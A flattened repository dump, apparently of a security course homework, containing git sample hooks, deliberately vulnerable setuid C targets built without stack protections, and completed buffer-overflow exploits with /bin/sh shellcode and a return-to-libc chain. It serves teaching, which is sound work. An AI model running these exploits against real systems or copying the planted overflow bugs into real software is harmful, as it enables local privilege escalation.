# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/heads/main>
<START OF ./.git/refs/remotes/origin/master>
5eef708ef223be75f74e68d36cedffcf5484f284

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.git/refs/remotes/origin/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/remotes/origin/main>
<START OF ./repo.txt>
<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[2];  

  char buf[32];
  memset(buf, 0x90, 32);
  strncpy(buf+10, shellcode, 22);
  
  uint32_t ret = 0xffffcfdc;

  env[0] = buf;  
  env[1] = NULL;

  args[0] = TARGET;
  args[1] = (char*)&ret;
  args[2] = NULL;
  
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 

  char buf[500];
  memset(buf, 0x90, 500);
  memcpy(buf+400, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 488);
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = "400";
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[256];
  int32_t *intvec = (int32_t*)buf;

  memset(buf, 0x90, 256);
  memcpy(buf+32, shellcode, sizeof(shellcode)); 

  intvec[16] = 0xffffcf88;
  intvec[17] = 0xffffcf88;
  intvec[18] = 0xffffcf88;
  intvec[19] = 0xffffcf88;
  intvec[20] = 0xffffcf88;

  args[0] = TARGET;
  args[1] = buf; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[424];
  memset(buf, 0x90, 424);
  memcpy(buf+200, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 412);
  *addr_ptr++ = 0xffffcf5c;
  *addr_ptr++ = 0xffffcf5c;  
  *addr_ptr++ = 0xffffcf5c;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit1</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit0</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit2</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<START OF ./.git/config>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/main

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
Initial commit of project files

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/info/exclude>
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 0000000000000000000000000000000000000000 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/refs/heads/main>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899467 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/logs/refs/remotes/origin/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899483 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902050 -0400	update by push
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753703 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/main>
<START OF ./.git/hooks/commit-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
